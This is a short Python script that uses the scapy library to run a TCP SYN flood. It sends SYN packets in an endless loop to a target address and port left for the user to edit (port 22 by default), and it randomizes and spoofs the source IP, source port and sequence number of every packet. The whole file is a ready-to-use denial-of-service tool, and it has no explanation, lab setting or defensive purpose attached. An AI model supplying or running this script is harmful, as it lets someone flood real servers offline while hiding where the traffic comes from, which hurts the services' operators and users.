#!/bin/env python3 
from scapy.all import IP, TCP, send 
from ipaddress import IPv4Address 
from random import getrandbits 


ip = IP(dst="*.*.*.*") #EDIT dst!
tcp = TCP(dport=22, flags="S") #EDIT dport!
pkt = ip/tcp 


while True: 
  pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP 
  pkt[TCP].sport = getrandbits(16) # source port 
  pkt[TCP].seq = getrandbits(32) # sequence number 
  send(pkt, verbose = 0)
